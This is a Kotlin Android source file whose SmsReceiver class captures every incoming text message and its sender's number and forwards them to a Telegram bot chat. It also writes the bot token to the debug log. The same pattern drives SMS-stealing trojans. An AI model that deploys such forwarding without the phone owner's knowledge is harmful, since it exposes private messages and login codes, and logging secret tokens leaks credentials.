package com.assistant

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.telephony.SmsMessage
import android.util.Log

class SmsReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context?, intent: Intent?) {
        if (intent?.action == "android.provider.Telephony.SMS_RECEIVED") {
            val bundle = intent.extras
            if (bundle != null) {
                val pdus = bundle.get("pdus") as Array<*>
                val format = bundle.getString("format")
                val fullMessage = StringBuilder()
                var sender: String? = null

                for (pdu in pdus) {
                    val smsMessage = SmsMessage.createFromPdu(pdu as ByteArray, format)
                    fullMessage.append(smsMessage.messageBody)
                    if (sender == null) {
                        sender = smsMessage.originatingAddress
                    }
                }
                val messageToSend = if (sender != null) "Отправитель: $sender\nСообщение:\n$fullMessage" else fullMessage.toString()

                val token = BuildConfig.TELEGRAM_BOT_TOKEN
                val chatId = BuildConfig.TELEGRAM_CHAT_ID

                Log.d("SmsReceiver", token)

                val telegramAdapter = TelegramAdapter(token, chatId)
                telegramAdapter.sendMessage(messageToSend)
            }
        }
    }
}